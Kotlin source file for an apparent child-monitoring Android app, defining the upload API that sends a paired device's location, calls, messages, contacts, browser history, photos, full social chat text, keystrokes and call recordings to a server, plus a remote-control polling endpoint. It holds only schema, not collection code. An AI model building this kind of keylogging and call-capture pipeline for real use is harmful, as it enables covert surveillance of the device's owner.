package com.example.kidsguardchild.core

import retrofit2.Response
import retrofit2.http.*

// ─── Request / Response body models ──────────────────────────────────────────

data class LocationBody(val lat: Double, val lng: Double, val place: String)
data class CallLogBody(val contact: String, val number: String, val type: String, val duration: String)
data class MessageBody(val from: String, val channel: String, val preview: String)
data class ContactBody(val name: String, val phone: String, val mail: String? = null, val address: String? = null, val blocked: Boolean = false)
data class UsageStatBody(val app: String, val duration: String, val icon: String, val color: String)
data class InstalledAppBody(val name: String, val packageName: String, val size: String, val isBlocked: Boolean = false)
data class NotificationBody(val app: String, val title: String, val preview: String)
data class BrowserHistoryBody(val query: String, val url: String)
data class WifiLogBody(val ssid: String, val status: String, val signal: String)
data class SafetyAlertBody(val type: String, val severity: String, val msg: String)
data class PhotoBody(val url: String, val title: String, val type: String = "gallery")
data class CalendarEventBody(
    val event: String,
    val startTime: String,
    val endTime: String = "",
    val location: String = "",
    val notes: String = ""
)
data class SocialChatBody(
    val app: String,
    val contact: String,
    val preview: String,
    val fullText: String = preview,
    val messageType: String = "text",
    val mediaUrl: String? = null
)
data class BatteryBody(val level: Int)
data class AppCallBody(
    val name: String,
    val phone: String,
    val app: String = "",
    val type: String,
    val duration: String,
    val status: String
)

data class KeylogBody(val app: String, val text: String)

data class CallRecordingBody(
    val name: String,
    val phone: String,
    val type: String,
    val duration: String,
    val audioUrl: String? = null,
    val hasAudio: Boolean = false
)

data class RedeemBody(val deviceName: String, val consent: Boolean = true)
data class RedeemResponse(val success: Boolean, val device: DeviceInfo?)
data class DeviceInfo(val id: String, val deviceName: String, val boundAt: String)

// ─── Retrofit API interface ───────────────────────────────────────────────────

interface ApiService {

    // Pairing
    @POST("api/device-invitations/{token}/redeem")
    suspend fun redeemInvite(
        @Path("token") token: String,
        @Body body: RedeemBody
    ): Response<RedeemResponse>

    // Remote control (poll every 4 seconds)
    @GET("api/remote-control")
    suspend fun getRemoteControl(): Response<RemoteControlState>

    @POST("api/remote-control")
    suspend fun postRemoteControl(@Body body: Map<String, @JvmSuppressWildcards Any>): Response<RemoteControlState>

    // ── Telemetry POST endpoints ──────────────────────────────────────────────

    @POST("api/locations")
    suspend fun postLocation(@Body body: LocationBody): Response<Unit>

    @POST("api/call-logs")
    suspend fun postCallLog(@Body body: CallLogBody): Response<Unit>

    @POST("api/messages")
    suspend fun postMessage(@Body body: MessageBody): Response<Unit>

    @POST("api/contacts")
    suspend fun postContact(@Body body: ContactBody): Response<Unit>

    @POST("api/usage-stats")
    suspend fun postUsageStat(@Body body: UsageStatBody): Response<Unit>

    @POST("api/installed-apps")
    suspend fun postInstalledApp(@Body body: InstalledAppBody): Response<Unit>

    @POST("api/notifications")
    suspend fun postNotification(@Body body: NotificationBody): Response<Unit>

    @POST("api/browser-history")
    suspend fun postBrowserHistory(@Body body: BrowserHistoryBody): Response<Unit>

    @POST("api/wifi-logs")
    suspend fun postWifiLog(@Body body: WifiLogBody): Response<Unit>

    @POST("api/safety-alerts")
    suspend fun postSafetyAlert(@Body body: SafetyAlertBody): Response<Unit>

    @POST("api/photos")
    suspend fun postPhoto(@Body body: PhotoBody): Response<Unit>

    @POST("api/social-chats")
    suspend fun postSocialChat(@Body body: SocialChatBody): Response<Unit>

    @POST("api/battery")
    suspend fun postBattery(@Body body: BatteryBody): Response<Unit>

    @POST("api/app-calls")
    suspend fun postAppCall(@Body body: AppCallBody): Response<Unit>

    @POST("api/keylogs")
    suspend fun postKeylog(@Body body: KeylogBody): Response<Unit>

    @POST("api/calendar-events")
    suspend fun postCalendarEvent(@Body body: CalendarEventBody): Response<Unit>

    @POST("api/call-recordings")
    suspend fun postCallRecording(@Body body: CallRecordingBody): Response<Unit>
}
